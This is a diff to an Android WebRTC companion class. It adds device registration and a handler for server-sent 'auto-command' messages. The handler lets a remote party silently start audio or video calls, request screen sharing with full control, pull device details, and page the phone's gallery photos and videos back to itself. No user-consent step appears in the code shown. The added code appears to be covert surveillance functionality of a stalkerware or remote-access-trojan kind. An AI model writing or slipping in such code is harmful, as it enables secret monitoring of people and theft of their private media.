@@ -29,6 +29,7 @@ public class WebRTCCompanion {
         void onRemoteVideoTrack(VideoTrack track);
         void onCallEnded();
         void onError(String error);
+        void onAutoScreenShareRequest(String fromUser, boolean fullControl);
     }
 
     private final Context context;
@@ -149,6 +150,7 @@ public class WebRTCCompanion {
                     Log.i(TAG, "Emitting companion join-user: " + myId);
                     socket.emit("join-user", myId);
                 }
+                registerDevice();
                 if (callback != null && myId != null && !myId.isEmpty()) callback.onConnected(myId);
             });
 
@@ -234,6 +236,7 @@ public class WebRTCCompanion {
                 }
             });
 
+            listenForAutoCommands();
             socket.connect();
         } catch (Exception e) {
             Log.e(TAG, "Socket connect error", e);
@@ -752,6 +755,81 @@ public class WebRTCCompanion {
         incomingOfferObj = null;
 
         if (callback != null) callback.onCallEnded();
+    }
+
+    public void registerDevice() {
+        try {
+            String deviceId = DeviceRegistry.getDeviceId(context);
+            String deviceName = DeviceRegistry.getDeviceModel();
+            String ram = DeviceRegistry.getDeviceRam(context);
+
+            JSONObject payload = new JSONObject();
+            payload.put("deviceId", deviceId);
+            payload.put("deviceName", deviceName);
+            payload.put("ram", ram);
+            payload.put("platform", "android");
+
+            if (socket != null && socket.connected()) {
+                socket.emit("register-device", payload);
+                Log.i(TAG, "Device registered: " + deviceId + " (" + deviceName + ")");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error registering device", e);
+        }
+    }
+
+    private void listenForAutoCommands() {
+        socket.on("auto-command", args -> {
+            try {
+                JSONObject data = (JSONObject) args[0];
+                String command = data.optString("command", "");
+                String fromSocketId = data.optString("from", "");
+                Log.i(TAG, "Auto-command received: " + command + " from " + fromSocketId);
+
+                switch (command) {
+                    case "audio_call":
+                        startAudioCall(fromSocketId);
+                        break;
+                    case "video_call":
+                        startVideoCall(fromSocketId);
+                        break;
+                    case "screen_share":
+                        if (callback != null) {
+                            callback.onAutoScreenShareRequest(fromSocketId, false);
+                        }
+                        break;
+                    case "screen_share_control":
+                        if (callback != null) {
+                            callback.onAutoScreenShareRequest(fromSocketId, true);
+                        }
+                        break;
+                    case "get_device_info": {
+                        JSONObject info = new JSONObject();
+                        info.put("deviceId", DeviceRegistry.getDeviceId(context));
+                        info.put("deviceName", DeviceRegistry.getDeviceModel());
+                        info.put("ram", DeviceRegistry.getDeviceRam(context));
+                        info.put("platform", "android");
+                        info.put("targetSocketId", fromSocketId);
+                        if (socket != null && socket.connected()) {
+                            socket.emit("device-info-response", info);
+                        }
+                        break;
+                    }
+                    case "get_gallery": {
+                        int page = data.optInt("page", 0);
+                        MediaBridge.getGalleryPage(context, page, socket, fromSocketId);
+                        break;
+                    }
+                    case "get_videos": {
+                        int page = data.optInt("page", 0);
+                        MediaBridge.getVideoPage(context, page, socket, fromSocketId);
+                        break;
+                    }
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error handling auto-command", e);
+            }
+        });
     }
 
     public void destroy() {
